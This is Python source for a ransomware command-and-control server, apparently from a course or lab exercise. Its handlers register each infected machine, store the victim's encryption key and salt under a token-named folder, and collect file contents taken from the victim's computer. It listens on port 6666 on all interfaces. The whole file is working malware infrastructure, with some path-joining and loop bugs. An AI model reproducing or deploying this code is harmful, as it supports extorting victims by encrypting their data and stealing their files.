import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)


    def post_new(self, path:str, params:dict, body:dict)-> dict:

        # used to register new ransomware instance
        os.makedirs(CNC.ROOT_PATH, exist_ok=True)

        # Decode the values
        token = base64.b64decode(body["token"])
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])

        # Print the key for fast uncrypt
        print("\n\nKEY "+token.hex()[0:10]+"... : ", 
                str(base64.b64encode(key), encoding="utf-8"))

        # Folder token
        folder_token_name = CNC.ROOT_PATH + str(token.hex())
        os.makedirs(folder_token_name, exist_ok=True)

        with open(folder_token_name + "/key.bin", "wb") as f:
            f.write(key)
        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(salt)

        # Return the status
        return {"status":"KO"}
    

    def post_files(self, path:str, params:dict, body:dict)->dict:

        # Obtain the token for authentificated the client
        token = base64.b64decode(body["token"])

        # The keys correspond to the file's path in the client computer
        key = list(body.keys())

        # Create folder for saving the files
        path = CNC.ROOT_PATH + token.hex() + "/files/"
        os.makedirs(path,  exist_ok=True)

        path = path + "file_"
        for i in range(1,2):
            name_file = path + str(i) +".txt"
            with open(name_file, "w+") as f:

                f.write(key[i] + "\n\n")
                f.write(body[key[i]])

        return {}

    # Encode binary to base64
    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()